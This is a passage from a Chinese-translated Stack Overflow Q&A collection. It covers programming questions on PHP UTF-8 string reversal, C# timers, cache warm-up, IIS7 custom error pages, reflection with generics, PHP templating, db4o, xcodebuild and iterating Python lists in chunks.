// http://www.php.net/manual/en/function.grapheme-strlen.php
$string = "a\xCC\x8A"  // 'LATIN SMALL LETTER A WITH RING ABOVE' (U+00E5)
         ."o\xCC\x88"; // 'LATIN SMALL LETTER O WITH DIAERESIS'  (U+00F6)

var_dump(array_map(function($elem) { return strtoupper(bin2hex($elem)); },
[
  'should be' => "o\xCC\x88"."a\xCC\x8A",
  'grapheme' => utf8_strrev($string),
  'mbstring' => utf8_strrev2($string),
  'pcre' => utf8_strrev3($string)
])); 
```

结果就在这里。

```
array(4) {
  ["should be"]=>
  string(12) "6FCC8861CC8A"
  ["grapheme"]=>
  string(12) "6FCC8861CC8A"
  ["mbstring"]=>
  string(12) "CC886FCC8A61"
  ["pcre"]=>
  string(12) "CC886FCC8A61"
} 
```

自 PHP 5.5 (intl 3.0) 起可以使用 IntlBreakIterator；

```
function utf8_strrev($str)
{
    $it = IntlBreakIterator::createCodePointInstance();
    $it->setText($str);

    $ret = '';
    $pos = 0;
    $prev = 0;

    foreach ($it as $pos) {
        $ret = substr($str, $prev, $pos - $prev) . $ret;
        $prev = $pos;
    }

    return $ret;  
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-12T02:14:09.753

答案

```
function mb_strrev($text, $encoding = null)
{
    $funcParams = array($text);
    if ($encoding !== null)
        $funcParams[] = $encoding;
    $length = call_user_func_array('mb_strlen', $funcParams);

    $output = '';
    $funcParams = array($text, $length, 1);
    if ($encoding !== null)
        $funcParams[] = $encoding;
    while ($funcParams[1]--) {
         $output .= call_user_func_array('mb_substr', $funcParams);
    }
    return $output;
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-21T07:00:01.403

另一种方法：

```
function mb_strrev($str, $enc = null) {
    if(is_null($enc)) $enc = mb_internal_encoding();
    $str = mb_convert_encoding($str, 'UTF-16BE', $enc);
    return mb_convert_encoding(strrev($str), $enc, 'UTF-16LE');
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-11-03T20:11:23.900

这很容易`utf8_strrev( $str )`。请参阅我在下面复制的库的相关[源代码：](http://pageconfig.com/post/portable-utf8)

```
function utf8_strrev( $str )
{
    return implode( array_reverse( utf8_split( $str ) ) );
}

function utf8_split( $str , $split_length = 1 )
{
    $str    = ( string ) $str;

    $ret    = array( );

    if( pcre_utf8_support( ) )
    {
        $str    = utf8_clean( $str );

        $ret    = preg_split('/(?<!^)(?!$)/u', $str );

        // \X is buggy in many recent versions of PHP
        //preg_match_all( '/\X/u' , $str , $ret );
        //$ret  = $ret[0];
    }
    else
    {
        //Fallback

        $len    = strlen( $str );

        for( $i = 0 ; $i < $len ; $i++ )
        {
            if( ( $str[$i] & "\x80" ) === "\x00" )
            {
                $ret[]  = $str[$i];
            }
            else if( ( ( $str[$i] & "\xE0" ) === "\xC0" ) && ( isset( $str[$i+1] ) ) )
            {
                if( ( $str[$i+1] & "\xC0" ) === "\x80" )
                {
                    $ret[]  = $str[$i] . $str[$i+1];

                    $i++;
                }
            }
            else if( ( ( $str[$i] & "\xF0" ) === "\xE0" ) && ( isset( $str[$i+2] ) ) )
            {
                if( ( ( $str[$i+1] & "\xC0" ) === "\x80" ) && ( ( $str[$i+2] & "\xC0" ) === "\x80" ) )
                {
                    $ret[]  = $str[$i] . $str[$i+1] . $str[$i+2];

                    $i  = $i + 2;
                }
            }
            else if( ( ( $str[$i] & "\xF8" ) === "\xF0" ) && ( isset( $str[$i+3] ) ) )
            {
                if( ( ( $str[$i+1] & "\xC0" ) === "\x80" ) && ( ( $str[$i+2] & "\xC0" ) === "\x80" ) && ( ( $str[$i+3] & "\xC0" ) === "\x80" ) )
                {
                    $ret[]  = $str[$i] . $str[$i+1] . $str[$i+2] . $str[$i+3];

                    $i  = $i + 3;
                }
            }
        }
    }

    if( $split_length > 1 )
    {
        $ret = array_chunk( $ret , $split_length );

        $ret    = array_map( 'implode' , $ret );
    }

    if( $ret[0] === '' )
    {
        return array( );
    }

    return $ret;
}

function utf8_clean( $str , $remove_bom = false )
{
    $regx = '/([\x00-\x7F]|[\xC0-\xDF][\x80-\xBF]|[\xE0-\xEF][\x80-\xBF]{2}|[\xF0-\xF7][\x80-\xBF]{3})|./s';

    $str    = preg_replace( $regx , '$1' , $str );

    if( $remove_bom )
    {
        $str    = utf8_str_replace( utf8_bom( ) , '' , $str );
    }

    return $str;
}

function utf8_str_replace( $search , $replace , $subject , &$count = 0 )
{
    return str_replace( $search , $replace , $subject , $count );
}

function utf8_bom( )
{
    return "\xef\xbb\xbf";

}

function pcre_utf8_support( )
{
    static $support;

    if( !isset( $support ) )
    {
        $support = @preg_match( '//u', '' );
        //Cached the response
    }

    return $support;
} 
```

# c# - 计时器不会“循环”

> ID：434255
> 
> 赞同：0
> 
> 时间：2009-01-12T02:22:17.273
> 
> 标签：c#, timer

好吧，这就是交易。我正在尝试制作一个 GUI 应用程序但没有 GUI 的应用程序。所以当应用程序启动时，它有一个带有登录屏幕的小表单（我已经完成了这部分）。

这是表单运行的代码，`main()`但一旦关闭，我就将其处理掉。

```
static void Main() 
{       
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);                        
    //Create an instance of form1
    Form1 form1 = new Form1();          
    Application.Run(form1);

    if(form1.isLoggedIn) 
    {             
        filename = Path.Combine(Environment.GetFolderPath(System.Environment.SpecialFolder.CommonApplicationData), DateTime.Now.ToString("ddMMyyhhmm") + "-" + form1.username);
        Flow palm = new Flow(new FlowArguments(form1.username, filename));
        MessageBox.Show("Thankyou, exiting...");
        form1.Dispose();                
    } 
} 
```

因此，正如您在表单关闭后所看到的那样，如果有人登录，则 main 会继续运行。如果您仔细观察，就会`Flow`发现创建的类有一个实例。

这是一个非常短的课程，我们开始：

```
public class Flow 
{
    //global variables
    FlowArguments FlowArgs;
    System.Threading.Timer tm;

    //constructor
    public Flow(FlowArguments fmg) 
    {
        FlowArgs = fmg;

        tm = new System.Threading.Timer(Tick, null, 
                                            System.Threading.Timeout.Infinite, 10000);

        using(StreamWriter sw = new StreamWriter(FlowArgs.Filename)) 
        {            
            //sw.writelines that SO doesnt really care for.               
        }

        //enable the timer
        tm.Change(0, 100);
    }

    public void Tick(object State) 
    {
        Console.WriteLine("Hello");
        //a bunch of SteamWriter writeline methods that SO doesnt care for.
    }

    public void WriteProcesses(StreamWriter sw, DateTime dw) 
    {
        var localAll = Process.GetProcesses().Where(o => o.ProcessName.ToLower() != "svchost");
        foreach(Process p in localAll) 
        {
            sw.WriteLine("@" + p.ProcessName +
                         "[" + dw.ToString("ddMMyyhhmm") + "]" +
                         "[" + FlowArgs.Username + "]");
        }              
    }
} 
```

如您所见，我确实启动了计时器。但是由于它使用`System.Threading.Timer`（因为我在某处读到它`Form.Timer`确实不合适）它在线程池上运行（根据 MSDN），但是当这种情况发生时，主窗体现在已经退出，`Main()`因此程序关闭。

我可能的解决方案是什么？该计时器将每 10 分钟运行一次（抓取进程）。关闭 GUI 后，我计划制作一个系统图标托盘，用户可以使用它来关闭程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T03:15:08.133

删除所有线程内容并以实现系统托盘图标的形式完成所有操作。把你的计时器放在那个表格里，你想要的一切都会完成。

就像是

```
LoginForm login = new LoginForm();
if(login.ShowDialog()==DialogResult.OK)
{
    Application.Run(new SystemTrayForm());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T02:30:19.613

如果你想让前台线程等待你可以使用 WaitHandle。

[http://msdn.microsoft.com/en-us/library/system.threading.waithandle.aspx](http://msdn.microsoft.com/en-us/library/system.threading.waithandle.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T02:49:14.877

谢谢，这就是我需要的，所以这就是我实现的：

```
if(form1.isLoggedIn) {             
    //Create a wait handle for the UI thread.
    AutoResetEvent hold = new AutoResetEvent(false);

    filename = Path.Combine(Environment.GetFolderPath(System.Environment.SpecialFolder.CommonApplicationData), DateTime.Now.ToString("ddMMyyhhmm") + "-" + form1.username);
    Flow palm = new Flow(new FlowArguments(form1.username, filename), hold);

    //wait for the background thread to finish.
    hold.WaitOne(Timeout.Infinite);

    MessageBox.Show("Thankyou, exiting...");
    form1.Dispose();                
} 
```

如您所见，它将 AutoResetEvent（来自 MSDN 计时器类示例）的引用传递给 Flow 类的构造函数。从那里我可以调用“set”方法来释放等待线程。我现在明白了。

然而

```
hold.WaitOne(Timeout.Infinite); 
```

等待不确定的时间..我想向 Flow 类发送一个“命令”以停止计时器并调用等待句柄上的“set”方法，以便 UI 线程可以退出..

我如何发送“信号”..

注意：我还没有决定将系统托盘图标放在哪里。因此，如果我更容易将它放在 Flow 类中，我会这样做。

# caching - 什么是预热缓存？

> ID：434259
> 
> 赞同：23
> 
> 时间：2009-01-12T02:27:14.830
> 
> 标签：caching, multicore, warm-up

我正在使用一些多核模拟器，例如 GEMS 或 M5。在所有这些中，都有一个“预热缓存”的选项。这个词是什么意思？

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2009-01-12T02:32:36.707

预热只是加载一组数据以便缓存填充有效数据的时期。如果您正在针对通常具有高缓存命中率的系统进行性能测试，如果没有预热，您将得到错误的数字，因为在您的使用场景中通常会出现缓存命中的情况不会并且会拖累您的数字.

# asp.net - IIS7 在设置 Response.StatusCode 时覆盖 customErrors？

> ID：434272
> 
> 赞同：99
> 
> 时间：2009-01-12T02:37:56.913
> 
> 标签：asp.net, iis-7

这里有一个奇怪的问题。每个人都知道，如果您使用 web.config 的`customErrors`部分来制作自定义错误页面，您应该将您`Response.StatusCode`的设置为适当的。例如，如果我创建一个自定义 404 页面并将其命名为 404.aspx，我可以`<% Response.StatusCode = 404 %>`输入内容以使其具有真正的 404 状态标题。

一直跟着我？好的。现在尝试在 IIS7 上执行此操作。我无法让它工作，期间。如果`Response.StatusCode`在自定义错误页面中设置，IIS7 似乎会完全覆盖自定义错误页面，并显示自己的状态页面（如果您配置了一个。）

有没有其他人看到过这种行为，也可能知道如何解决它？它在 IIS6 下工作，所以我不知道为什么事情发生了变化。

注意：这与[ASP.NET Custom 404 Returning 200 OK 而不是 404 Not Found中的问题不同](https://stackoverflow.com/questions/347281/asp-net-custom-404-returning-200-ok-instead-of-404-not-found)

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2009-03-31T20:07:21.467

在 system.webServer/httpErrors 部分将 existingResponse 设置为 PassThrough：

```
 <system.webServer>
    <httpErrors existingResponse="PassThrough" />
  </system.webServer> 
```

existingResponse 属性的默认值为 Auto：

> 自动告诉自定义错误模块做**正确**的事情。客户端看到的实际错误文本将受到调用中返回的 fTrySkipCustomErrors 值的影响`IHttpResponse::GetStatus`。当 fTrySkipCustomErrors 设置为 true 时，自定义错误模块将让响应通过，但如果设置为 false，自定义错误模块将使用自己的文本替换文本。

更多信息：[对 IIS7 自定义错误模块的期望](http://blogs.iis.net/ksingla/archive/2008/02/18/what-to-expect-from-iis7-custom-error-module.aspx)

* * *

## 回答 #2

> 赞同：82
> 
> 时间：2009-05-01T22:34:45.503

使行为一致的最简单方法是清除错误并使用[Response.TrySkipIisCustomErrors](http://msdn.microsoft.com/en-us/library/system.web.httpresponse.tryskipiiscustomerrors.aspx)并将其设置为 true。这将覆盖页面内的 IIS 全局错误页面处理或 Application_Error 中的全局错误处理程序。

```
Server.ClearError();
Response.TrySkipIisCustomErrors = true; 
```

通常，您应该在处理应用程序错误处理程序未捕获的所有错误的 Application_Error 处理程序中执行此操作。

更详细的信息可以在这篇博文中找到： [http ://www.west-wind.com/weblog/posts/745738.aspx](http://www.west-wind.com/weblog/posts/745738.aspx)

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2009-01-12T09:41:07.387

**已解决：**事实证明，需要打开“详细错误”才能让 IIS7“通过”您可能拥有的任何错误页面。见[http://forums.iis.net/t/1146653.aspx](http://forums.iis.net/t/1146653.aspx)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-07-31T12:44:48.700

我不确定这在本质上是否相似，但我解决了一个表面上听起来相似的问题，这就是我处理它的方法。

首先，在我的情况下，existingResponse (Auto) 的默认值是正确的答案，因为我有一个自定义的 404、400 和 500（我可以创建其他的，但这三个足以满足我的工作）。以下是对我有帮助的相关部分。

从 web.config：

```
<customErrors mode="Off" /> 
```

和

```
<httpErrors errorMode="Custom" existingResponse="Auto" defaultResponseMode="ExecuteURL">
  <clear />
  <error statusCode="404" path="/errors/404.aspx" responseMode="ExecuteURL" />
  <error statusCode="500" path="/errors/500.aspx" responseMode="ExecuteURL" />
  <error statusCode="400" path="/errors/400.aspx" responseMode="ExecuteURL" />
</httpErrors> 
```

从那里，我将它添加到 global.asax 上的 Application_Error 中：

```
 Response.TrySkipIisCustomErrors = True 
```

在我的每个自定义错误页面上，我都必须包含正确的响应状态代码。就我而言，我使用自定义 404 将用户发送到我网站的不同部分，因此我**不**希望返回 404 状态代码，除非它实际上是一个死页。

无论如何，我就是这样做的。希望对某人有所帮助。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-02-26T19:34:48.923

这个问题一直很头疼。前面提到的任何建议都没有单独为我解决，所以我将我的解决方案包括在内。作为记录，我们的环境/平台使用：

*   .NET 框架 4
*   MVC 3
*   IIS8（工作站）和 IIS7（网络服务器）

具体来说，我试图获得一个 HTTP 404 响应，它将用户重定向到我们的自定义 404 页面（通过 Web.config 设置）。

首先，我的代码必须抛出一个`HttpException`. 从控制器返回 a`NotFoundResult`并没有达到我想要的结果。

```
throw new HttpException(404, "There is no class with that subject"); 
```

然后我必须在 Web.config 中配置和**节点**。`customErrors``httpError`

```
<customErrors mode="On" defaultRedirect="/classes/Error.aspx">
  <error statusCode="404" redirect="/classes/404.html" />
</customErrors> 
```

...

```
<httpErrors errorMode="Custom" existingResponse="Auto" defaultResponseMode="ExecuteURL">
  <clear />
  <error statusCode="404" path="/classes/404.aspx" responseMode="ExecuteURL" />
</httpErrors> 
```

请注意，我留下了`existingResponse`as `Auto`，这与 @sefl 提供的解决方案不同。

这些`customErrors`设置似乎对于处理我的显式抛出是必要的`HttpException`，而`httpErrors`节点处理的 URL 超出了 Globals.asax.cs 中指定的路由模式。

PS有了这些设置我不需要设置`Response.TrySkipIisCustomErrors`

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-12-27T22:01:52.017

`TrySkipIisCustomErrors`只是谜题的一部分。如果您使用自定义错误页面，但您还想提供一些基于 4xx 状态的 RESTful 内容，那么您就有问题了。将 web.config 的 httpErrors.existingResponse 设置为“Auto”不起作用，因为 .net 似乎总是向 IIS 提供一些页面内容，因此使用“Auto”会导致所有（或至少一些）自定义错误页面不被使用。使用“替换”也不起作用，因为响应将包含您的 http 状态代码，但其内容将为空或填充自定义错误页面。而“PassThrough”实际上会关闭 CEP，因此无法使用。

因此，如果您想在某些情况下绕过 CEP（绕过我的意思是返回带有某些内容的状态 4xx），您将需要额外的步骤：清除错误：

```
void Application_Error(object sender, EventArgs e)
{
    var httpException = Context.Server.GetLastError() as HttpException;
    var statusCode = httpException != null ? httpException.GetHttpCode() : (int)HttpStatusCode.InternalServerError;

    Context.Server.ClearError();
    Context.Response.StatusCode = statusCode;
} 
```

因此，如果您想使用 REST 响应（即 400 - 错误请求）并使用它发送一些内容，您只需在 web.config 的 httpErrors 部分中设置`TrySkipIisCustomErrors`某个操作并设置`existingResponse`为“自动”。现在：

*   当没有错误（动作返回 4xx 或 5xx）并且返回了一些内容时，不使用 CEP 并将内容传递给客户端；
*   当出现错误（抛出异常）时，错误处理程序返回的内容将被删除，因此使用 CEP。

如果您想从您的操作返回带有空内容的状态，它将被视为空响应并显示 CEP，因此还有一些改进此代码的空间。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-12T02:53:21.967

默认情况下，IIS 7 使用详细的自定义错误消息，因此我假设 Response.StatusCode 将等于 404.XX 而不仅仅是 404。

您可以将 IIS7 配置为使用更简单的错误消息代码，或者修改您的代码来处理 IIS7 提供的更详细的错误消息。

此处提供更多信息：http: [//blogs.iis.net/rakkimk/archive/2008/10/03/iis7-enabling-custom-error-pages.aspx](http://blogs.iis.net/rakkimk/archive/2008/10/03/iis7-enabling-custom-error-pages.aspx)

进一步的调查显示我有错误的方法 - 默认情况下不是详细消息，但如果您看到您提到的不同错误消息，它们可能已在您的盒子上打开。

# c# - 使用泛型和方法信息

> ID：434276
> 
> 赞同：0
> 
> 时间：2009-01-12T02:42:18.107
> 
> 标签：c#, .net, reflection

我正在为一个开源项目构建一个基本的分析器。一个要求是测量方法的执行时间。虽然这很容易，但我必须在运行时之前不知道方法或其包含类的情况下这样做。调用探查器的方法是用户从活动文档中的 IDE 调用探查器。因此，如果 class1 是打开的，并且用户右键单击文档中的空白处，选择配置文件，那么，只有这样，该类才是已知的。

我有这段代码可以使用 MethodInfo：

```
MethodInfo methodInfo = typeof(t).GetMethod(s); 
```

T 只是一个泛型类型持有者（类 X，其中 T ：类，是类签名）。s 只是方法名称的字符串。

但是，我有这个错误：

需要类型名称，但找到了参数名称。

该行代码的包含方法将 t 作为类型 T 的参数，但将其移出并不能解决问题。T 只是一个对象，如果我提供一个对象名称，如类名，则不会出错。

是什么赋予了？

编辑：也许激活器可以解决这个问题。

另外，我可以使用 where 子句将 T 限制为仅是静态类吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T03:25:20.920

导致该错误的原因是 typeof 需要一个类型名称或参数，例如 typeof(int) 或 typeof(T) ，其中 T 是一个类型参数。看起来 t 是 System.Type 的一个实例，因此不需要 typeof。

你需要一个泛型类型吗？这行不通吗？

```
public void DoSomething(object obj, string methodName)
{
  MethodInfo method = obj.GetType().GetMethod(methodName);
  // Do stuff
} 
```

或者

```
public void DoSomething(Type t, string methodName)
{
  MethodInfo method = t.GetMethod(methodName);
  // Do stuff
} 
```

此外，没有办法将类型参数限制为静态类。我不确定这有什么用，因为您不能拥有它的实例，并且它无法实现您可以在通用方法中使用的任何接口。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T03:04:47.437

也许你需要

```
t.GetType().GetMethod(s) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T16:43:48.953

```
public void DoSomething(object obj, string methodName)
{
  MethodInfo method = obj.GetType().GetMethod(methodName);
  // Do stuff
} 
```

这已经成功了（与上面的 2 个帖子相同）。

# php - 超级基础模板系统

> ID：434283
> 
> 赞同：1
> 
> 时间：2009-01-12T02:46:33.103
> 
> 标签：php, templates

我希望能够使用以下方案用正则表达式替换文件中的内容：

我有一个数组：

```
$data = array(
  'title' => 'My Cool Title',
  'content' => ''
) 
```

我也有一个模板（为了清楚起见，我们假设下面被分配给一个变量*$template*）

```
<html>
<title><% title %></title>
<body><% content %></body>
</html> 
```

我希望能够使用一个正则表达式来完成整个事情，因此它可以尽可能通用；以下是我的尝试（不起作用）

```
$endMarkup = preg_replace('/<% ([a-z]+) %>/',$data["\\1"], $template); 
```

是否有一个干净的解决方案可以通过数组索引将关联数组数据放入模板中？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T02:54:47.037

事先做一些工作，你可以通过一个`preg_replace`电话来完成：

```
$replacements = array();
foreach ($data as $search => $replacement) {
   $replacements["/<% $search %>/"] = $replacement;
}
$endMarkup = preg_replace(
     array_keys($replacements), 
     array_values($replacements), 
     $template); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T03:15:30.427

如果您愿意，可以尝试不使用正则表达式。函数 str_replace 就是为此而生的。如果您不了解正则表达式，这将是您的最佳选择。

测试数据：

```
$data = array(
  'title' => 'My Cool Title',
  'content' => ''
);

$file = <<< EOF
<html>
<title><% title %></title>
<body><% content %></body>
</html>
EOF; 
```

功能及示例：

```
function replace_template($template, $data)
{
    $replace = array_fill(0, count($data), '<%% %s %%>');
    $keys = array_map('sprintf', $replace, array_keys($data));
    $output = str_replace($keys, $data, $template);
    return $output;
}

echo replace_template($file, $data); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T17:44:10.173

你为什么要为模板而烦恼？PHP 已经是一种模板语言。除非您试图排除代码执行的可能性，否则您需要的一切都内置在语言中。

您可以使用带有短标签的普通 PHP 编写模板。您可以将其全部包装在一个函数中以稍微限制变量范围。您可以使用`import()`从数组中获取少量变量。您可以使用`include`or`require()`来处理加载、解析和将值插入到文件中。您可以使用输出缓冲 ( `ob_start()`/ `ob_end()`) 来处理捕获字符串中的输出。一切都内置，快速且经过全面测试。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T02:55:25.787

您可以使用[preg_replace_callback()](http://php.net/preg_replace_callback)来做到这一点。这是我的做法：

```
function get_data($matches) {
    global $data;

    return $data[$matches[1]];
}

$endMarkup = preg_replace_callback('/<% ([a-z]+) %>/', 'get_data', $template); 
```

或者如果您愿意，可以在一行中使用[create_function() ：](http://php.net/create_function)

```
$endMarkup = preg_replace_callback('/<% ([a-z]+) %>/', create_function('$matches', 'global $data; return $data[$matches[1]];'), $template); 
```

# database - db4o 关注点

> ID：434284
> 
> 赞同：3
> 
> 时间：2009-01-12T02:47:06.147
> 
> 标签：database, object, db4o

我有兴趣在我的桌面应用程序中使用 db4o 作为我的持久性机制，但我担心一些事情。

**第一个问题：意外剪裁非常复杂的对象图。**

假设我有一棵高度为 10 的树并且我获取了根，它如何处理我再次存储根对象？

据我了解，它不会获取整个树，而是获取前 5 个引用层。

所以..如果我对根进行微不足道的更改然后存储它，它会在树的下方剪掉节点，实质上是删除它们。

如果没有..它如何处理这个？

**第二个关注点：在更大的对象图中提取子图**

使用上面的树示例...如果数据库包含 1 棵巨大的树，我可以在其中查询单个节点吗？由于`.store`只调用了一次，我的数据库是否认为它只包含 1 条*“记录”*？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-13T12:56:16.883

您必须非常小心，因为可能会发生两件事：您可以将整个数据库拉入内存，或者只是部分图（其余对象将为空）。
在 db4o 中有 Activator 和 Update 深度的概念，可以根据 dbv40 配置或在获取对象时进行配置。它是您告诉 db40 在获取引用对象时您希望他走多深的方式。检查 db4o 网站，有关于它的文档：http:
[//developer.db4o.com/Resources/view.aspx/Reference/Object_Lifecycle/Activation](http://developer.db4o.com/Resources/view.aspx/Reference/Object_Lifecycle/Activation)
[http://developer.db4o.com/Resources/view.aspx/Reference/Object_Lifecycle /Update_Depth](http://developer.db4o.com/Resources/view.aspx/Reference/Object_Lifecycle/Update_Depth)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-09-27T20:16:39.790

DB4O 的透明激活应该可以解决您在此处表达的大部分担忧。

# iphone - 无需从 Xcode 启动即可在模拟器中构建和安装 iPhone 应用程序的终端命令

> ID：434286
> 
> 赞同：9
> 
> 时间：2009-01-12T02:48:03.647
> 
> 标签：iphone, ios-simulator

是否有任何终端命令可用于实现此目的？

我知道`xcodebuild install -configuration`可以在不从 Xcode 启动的情况下从终端编译我们的 xcodeproj，但是编译文件在 iOS 下但不在 iPhone 模拟器中。我希望你们中的一个聪明人能帮助我。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-28T13:26:32.847

嘿，我发现你可以这样做：

```
xcodebuild -configuration Release -sdk iphonesimulator2.2 
```

这使得模拟器构建为 2.2 版（你可以`xcodebuild -showsdks`用来列出你有什么用处）。我遇到了一个试图让它在手机上启动的问题。xcodebuild -install 似乎对我没有任何帮助：S 有什么帮助吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-23T08:39:02.593

请看下面的github项目（搜索iphonesim）

这将允许您从命令行启动 iphone 模拟器。

（抱歉，似乎不允许我在此答案中发布有效的 URL）

# python - 以块为单位迭代列表的最“pythonic”方式是什么？

> ID：434287
> 
> 赞同：596
> 
> 时间：2009-01-12T02:48:22.960
> 
> 标签：python, list, loops, optimization, chunks

我有一个 Python 脚本，它将整数列表作为输入，我需要一次处理四个整数。不幸的是，我无法控制输入，否则我会将其作为四元素元组列表传入。目前，我正在以这种方式对其进行迭代：

```
for i in range(0, len(ints), 4):
    # dummy op for example code
    foo += ints[i] * ints[i + 1] + ints[i + 2] * ints[i + 3] 
```

不过，它看起来很像“C-think”，这让我怀疑有一种更 Pythonic 的方式来处理这种情况。该列表在迭代后被丢弃，因此不需要保留。也许这样的事情会更好？

```
while ints:
    foo += ints[0] * ints[1] + ints[2] * ints[3]
    ints[0:4] = [] 
```

不过，仍然不太“感觉”正确。：-/

相关问题：[如何在 Python 中将列表拆分为大小均匀的块？](https://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks-in-python)

* * *

## 回答 #1

> 赞同：521
> 
> 时间：2009-01-12T03:10:17.987

```
def chunker(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))
# (in python 2 use xrange() instead of range() to avoid allocating a list) 
```

适用于任何序列：

```
text = "I am a very, very helpful text"

for group in chunker(text, 7):
   print(repr(group),)
# 'I am a ' 'very, v' 'ery hel' 'pful te' 'xt'

print '|'.join(chunker(text, 10))
# I am a ver|y, very he|lpful text

animals = ['cat', 'dog', 'rabbit', 'duck', 'bird', 'cow', 'gnu', 'fish']

for group in chunker(animals, 3):
    print(group)
# ['cat', 'dog', 'rabbit']
# ['duck', 'bird', 'cow']
# ['gnu', 'fish'] 
```

* * *

## 回答 #2

> 赞同：401
> 
> 时间：2009-01-12T04:07:20.850

从 Python文档的[食谱](https://docs.python.org/library/itertools.html#itertools-recipes)部分修改：[`itertools`](http://docs.python.org/library/itertools.html)

```
from itertools import zip_longest

def grouper(iterable, n, fillvalue=None):
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue) 
```

**例子**

```
grouper('ABCDEFG', 3, 'x')  # --> 'ABC' 'DEF' 'Gxx' 
```

**注意：**在 Python 2 上使用`izip_longest`而不是`zip_longest`.

* * *

## 回答 #3

> 赞同：189
> 
> 时间：2009-01-12T03:06:09.103

```
chunk_size = 4
for i in range(0, len(ints), chunk_size):
    chunk = ints[i:i+chunk_size]
    # process chunk of size <= chunk_size 
```

* * *

## 回答 #4

> 赞同：28
> 
> 时间：2009-01-12T03:02:59.313

```
import itertools
def chunks(iterable,size):
    it = iter(iterable)
    chunk = tuple(itertools.islice(it,size))
    while chunk:
        yield chunk
        chunk = tuple(itertools.islice(it,size))

# though this will throw ValueError if the length of ints
# isn't a multiple of four:
for x1,x2,x3,x4 in chunks(ints,4):
    foo += x1 + x2 + x3 + x4

for chunk in chunks(ints,4):
    foo += sum(chunk) 
```

其他方式：

```
import itertools
def chunks2(iterable,size,filler=None):
    it = itertools.chain(iterable,itertools.repeat(filler,size-1))
    chunk = tuple(itertools.islice(it,size))
    while len(chunk) == size:
        yield chunk
        chunk = tuple(itertools.islice(it,size))

# x2, x3 and x4 could get the value 0 if the length is not
# a multiple of 4.
for x1,x2,x3,x4 in chunks2(ints,4,0):
    foo += x1 + x2 + x3 + x4 
```

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2017-09-29T14:29:12.673

如果您不介意使用外部包，您可以使用[`iteration_utilities.grouper`](https://iteration-utilities.readthedocs.io/en/latest/generated/grouper.html)from ¹。它支持所有可迭代对象（不仅仅是序列）：[`iteration_utilties`](https://iteration-utilities.readthedocs.io/en/latest/installation.html)

```
from iteration_utilities import grouper
seq = list(range(20))
for group in grouper(seq, 4):
    print(group) 
```

打印：

```
(0, 1, 2, 3)
(4, 5, 6, 7)
(8, 9, 10, 11)
(12, 13, 14, 15)
(16, 17, 18, 19) 
```

如果长度不是分组大小的倍数，它还支持填充（不完整的最后一组）或截断（丢弃不完整的最后一组）最后一个：

```
from iteration_utilities import grouper
seq = list(range(17))
for group in grouper(seq, 4):
    print(group)
# (0, 1, 2, 3)
# (4, 5, 6, 7)
# (8, 9, 10, 11)
# (12, 13, 14, 15)
# (16,)

for group in grouper(seq, 4, fillvalue=None):
    print(group)
# (0, 1, 2, 3)
# (4, 5, 6, 7)
# (8, 9, 10, 11)
# (12, 13, 14, 15)
# (16, None, None, None)

for group in grouper(seq, 4, truncate=True):
    print(group)
# (0, 1, 2, 3)
# (4, 5, 6, 7)
# (8, 9, 10, 11)
# (12, 13, 14, 15) 
```

* * *

## 基准

我还决定比较一些上述方法的运行时间。这是一个对数图，根据不同大小的列表分组为“10”个元素组。对于定性结果： 越低意味着越快：

[![在此处输入图像描述](https://i.stack.imgur.com/Rnz57.png)](https://i.stack.imgur.com/Rnz57.png)

至少在这个基准测试中`iteration_utilities.grouper`表现最好。紧随其后的是[克拉兹](https://stackoverflow.com/a/434411/5393381)的逼近。

基准是用¹创建的。用于运行此基准测试的代码是：[`simple_benchmark`](https://github.com/MSeifert04/simple_benchmark)

```
import iteration_utilities
import itertools
from itertools import zip_longest

def consume_all(it):
    return iteration_utilities.consume(it, None)

import simple_benchmark
b = simple_benchmark.BenchmarkBuilder()

@b.add_function()
def grouper(l, n):
    return consume_all(iteration_utilities.grouper(l, n))

def Craz_inner(iterable, n, fillvalue=None):
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue)

@b.add_function()
def Craz(iterable, n, fillvalue=None):
    return consume_all(Craz_inner(iterable, n, fillvalue))

def nosklo_inner(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))

@b.add_function()
def nosklo(seq, size):
    return consume_all(nosklo_inner(seq, size))

def SLott_inner(ints, chunk_size):
    for i in range(0, len(ints), chunk_size):
        yield ints[i:i+chunk_size]

@b.add_function()
def SLott(ints, chunk_size):
    return consume_all(SLott_inner(ints, chunk_size))

def MarkusJarderot1_inner(iterable,size):
    it = iter(iterable)
    chunk = tuple(itertools.islice(it,size))
    while chunk:
        yield chunk
        chunk = tuple(itertools.islice(it,size))

@b.add_function()
